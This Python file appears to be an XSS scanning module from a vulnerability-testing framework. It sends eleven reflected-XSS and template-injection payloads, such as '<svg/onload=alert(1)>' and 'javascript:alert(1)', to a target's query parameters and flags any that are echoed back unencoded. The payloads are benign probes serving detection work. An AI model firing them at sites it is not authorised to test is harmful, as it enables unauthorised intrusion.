"""XSS Testing Module — reflected, stored, DOM-based XSS detection."""

from __future__ import annotations
from typing import Any
import httpx, structlog
from src.core.module_runner import VulnModule

logger = structlog.get_logger(__name__)

class XSSModule(VulnModule):
    name = "xss_scanner"
    category = "xss"
    description = "Cross-Site Scripting detection (reflected, stored, DOM)"

    PAYLOADS = [
        '<script>alert("XSS")</script>', '"><svg/onload=alert(1)>',
        "'-alert(1)-'", '<img src=x onerror=alert(1)>',
        '{{7*7}}', '${alert(1)}', '<details/open/ontoggle=alert(1)>',
        'javascript:alert(1)', '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>', "';alert(1)//",
    ]

    async def test(self, target: str, params: dict, auth: Any = None,
                   hypothesis: dict | None = None) -> list[dict[str, Any]]:
        findings = []
        client = httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True)
        try:
            for payload in self.PAYLOADS:
                for param in (params or {"q": "test"}):
                    test_params = dict(params or {})
                    test_params[param] = payload
                    try:
                        resp = await client.get(target, params=test_params)
                        if payload in resp.text:
                            findings.append({
                                "title": f"Reflected XSS via '{param}' parameter",
                                "description": f"XSS payload reflected unencoded in response from {target}",
                                "severity": "high",
                                "category": "xss",
                                "affected_url": target,
                                "param": param,
                                "confidence": 0.85,
                                "evidence": {"payload": payload, "reflected": True,
                                             "status_code": resp.status_code},
                                "source_tool": self.name,
                            })
                            break  # Found for this param, move to next
                    except Exception:
                        pass
        finally:
            await client.aclose()
        return findings
